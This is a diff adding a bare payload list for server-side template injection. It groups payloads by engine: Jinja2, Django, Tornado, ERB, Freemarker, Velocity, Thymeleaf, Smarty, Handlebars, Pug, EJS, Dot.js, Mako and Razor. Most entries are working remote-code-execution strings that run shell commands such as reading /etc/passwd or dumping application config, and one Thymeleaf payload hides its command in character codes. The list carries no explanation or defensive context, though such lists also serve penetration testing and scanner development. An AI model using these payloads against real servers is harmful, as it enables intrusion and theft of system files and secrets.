@@ -1,0 +1,149 @@
+# Basic Server-Side Template Injection payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+[[7*7]]
+
+# Jinja2/Twig (Python/PHP)
+{{config}}
+{{config.items()}}
+{{settings}}
+{{self}}
+{{request}}
+{{request.environ}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[401]("cat /etc/passwd",shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+
+# Flask/Jinja2 specific
+{{ ''.__class__.__mro__[1].__subclasses__()[401]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+
+# Django (Python)
+{% debug %}
+{% load module %}
+{% include request.GET.template_name %}
+{% extends request.GET.template_name %}
+{% import request.GET.module %}
+{% with a=request.GET.param %}{{ a }}{% endwith %}
+{% for x in request.GET %}{{ x }}{% endfor %}
+{% if request.GET.param %}{{ request.GET.param }}{% endif %}
+{% autoescape off %}{{ request.GET.param }}{% endautoescape %}
+{% filter force_escape %}{{ request.GET.param }}{% endfilter %}
+{% csrf_token %}
+
+# Tornado (Python)
+{% import os %}
+{{ os.popen("cat /etc/passwd").read() }}
+{% import subprocess %}
+{{ subprocess.check_output(['cat','/etc/passwd']) }}
+{% raw %}
+    {% import os %}
+    {{ os.popen("cat /etc/passwd").read() }}
+{% end %}
+
+# ERB (Ruby)
+<%= system('cat /etc/passwd') %>
+<%= Dir.entries('/') %>
+<%= File.open('/etc/passwd').read %>
+<%= eval('2 + 2') %>
+<%= system('cat /etc/passwd') %>
+<%= `ls -la` %>
+<%= IO.popen('cat /etc/passwd').readlines() %>
+<%= require('open3').capture2('cat /etc/passwd') %>
+
+# Freemarker (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("cat /etc/passwd")}
+<#assign classloader=object?api.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("cat /etc/passwd")}
+
+# Velocity (Java)
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /etc/passwd"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+
+# Thymeleaf (Java)
+<p th:text="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\A').next()}"></p>
+<p th:text="${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}"></p>
+<p th:text="${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}"></p>
+
+# Smarty (PHP)
+{php}echo `cat /etc/passwd`;{/php}
+{php}system('cat /etc/passwd');{/php}
+{php}passthru('cat /etc/passwd');{/php}
+{php}echo shell_exec('cat /etc/passwd');{/php}
+{php}echo file_get_contents('/etc/passwd');{/php}
+{php}$handle=popen('cat /etc/passwd', 'r');echo fread($handle,4096);pclose($handle);{/php}
+
+# Handlebars (JavaScript)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('cat /etc/passwd');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Pug/Jade (Node.js)
+- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.execSync('cat /etc/passwd')
+
+# EJS (Node.js)
+<% require('child_process').exec('cat /etc/passwd', function(err, data) { %>
+<%= data %>
+<% }); %>
+
+# Dot.js (Node.js)
+{{= it.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd') }}
+
+# Mako (Python)
+<%
+import os
+x=os.popen('cat /etc/passwd').read()
+%>
+${x}
+
+# Razor (C#)
+@{
+    var process = System.Diagnostics.Process.Start("cmd.exe", "/c dir");
+    process.WaitForExit();
+    var output = process.StandardOutput.ReadToEnd();
+}
+@output
